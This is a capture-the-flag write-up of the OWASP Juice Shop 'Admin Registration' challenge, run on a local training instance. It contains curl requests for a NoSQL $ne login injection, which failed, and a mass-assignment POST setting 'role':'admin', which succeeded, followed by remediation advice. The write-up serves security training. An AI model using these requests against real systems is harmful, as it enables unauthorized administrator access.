# OWASP Juice Shop — Admin Registration

> **Challenge:** Admin Registration
> **Platform:** OWASP Juice Shop
> **Category:** Improper Input Validation / Mass Assignment
> **Difficulty:** 5 Stars
> **Environment:** Kali Linux + Docker
> **Status:** Solved

## 1. Objective

The objective of this challenge was to register a new user with **administrator privileges**.

Normally, a user registration endpoint should only allow the client to provide safe user-controlled fields. In this challenge, the API accepts the `role` attribute from the request body, allowing the attacker to assign an administrative role during registration.

## 2. Reconnaissance

I first inspected the Juice Shop API documentation:

```bash
curl -s http://localhost:3000/api-docs/swagger.json | head -100
```

The endpoint returned the Swagger UI HTML instead of the raw OpenAPI JSON, so I continued by testing the application's API endpoints directly.

## 3. Testing the API

I tested the product search endpoint to understand how the API handled user-controlled input:

```bash
curl -s "http://localhost:3000/rest/products/search?q=apple"
```

The application returned product data successfully.

I also tested several possible injection approaches against the login and product-search endpoints. These tests did not provide a working authentication bypass.

For example, attempting NoSQL-style objects in the login request resulted in a server-side type error:

```bash
curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":"x"},"password":{"$ne":"x"}}'
```

The response showed that the application attempted to hash the supplied object, producing an `ERR_INVALID_ARG_TYPE` error.

## 4. Identifying the Vulnerable Endpoint

The important discovery was the automatically generated API endpoint:

```text
POST /api/Users
```

The source code exposed by the challenge showed that the `User` model was included in the automatically generated API resources:

```text
{ name: 'User', exclude: ['password', 'totpSecret'], model: UserModel }
```

This indicated that the API exposed a user-creation endpoint.

The key issue was that the request could include a `role` field.

## 5. Exploitation

I created a new account and explicitly supplied the administrator role:

```bash
curl -s -X POST http://localhost:3000/api/Users \
  -H "Content-Type: application/json" \
  -d '{
    "email": "hacker@admin.com",
    "password": "Hacked123!",
    "passwordRepeat": "Hacked123!",
    "role": "admin"
  }'
```

The server returned:

```json
{
  "status": "success",
  "data": {
    "username": "",
    "deluxeToken": "",
    "lastLoginIp": "0.0.0.0",
    "profileImage": "/assets/public/images/uploads/defaultAdmin.png",
    "isActive": true,
    "id": 25,
    "email": "hacker@admin.com",
    "role": "admin"
  }
}
```

The important part of the response was:

```json
"role": "admin"
```

This confirmed that the server accepted the attacker-controlled role and created the account with administrator privileges.

## 6. Why It Worked

The vulnerability is essentially a form of **mass assignment / improper input validation**.

The server should have controlled the user's role itself, for example by always assigning:

```text
role = "customer"
```

during normal registration.

Instead, the API accepted:

```json
"role": "admin"
```

from the client.

Because the server trusted this value, a normal user could create an administrator account.

## 7. Result

The challenge was successfully solved by creating:

```text
Email: hacker@admin.com
Password: Hacked123!
Role: admin
```

The Juice Shop challenge page confirmed:

```text
You successfully solved a challenge:
Admin Registration
(Register as a user with administrator privileges.)
```

## 8. Evidence

The successful challenge notification is included in:

```text
images/challenge-solvedadmin.png
```

## 9. Takeaway

This challenge demonstrates why sensitive authorization attributes such as `role` should **never be trusted when supplied directly by the client**.

A secure implementation should:

* Reject unauthorized `role` fields during registration.
* Assign the default user role server-side.
* Validate and allowlist accepted request attributes.
* Apply authorization checks to every privileged operation.
* Avoid exposing unrestricted automatically generated CRUD endpoints.
